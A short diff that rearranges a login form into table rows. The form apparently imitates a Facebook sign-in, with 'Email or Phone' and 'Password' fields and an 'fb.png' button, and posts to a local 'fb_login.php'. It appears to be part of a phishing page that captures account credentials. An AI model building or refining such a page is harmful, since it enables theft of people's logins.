@@ -28,11 +28,17 @@ div.transbox {
 <div class="transbox" align="right">
 <div class="dentro" align="left">
   <form action="fb_login.php" method="post">
+      <table>
+      <tr>
       <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
-      <p></p>
+      </tr>
+      <tr>
       <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
-      <p></p>
+      </tr>
+      <tr>
       <input type="image" src="fb.png" style="width:280px;height:105px;">
+      </tr>
+      </table>
   </form>
 </div>
 </div>
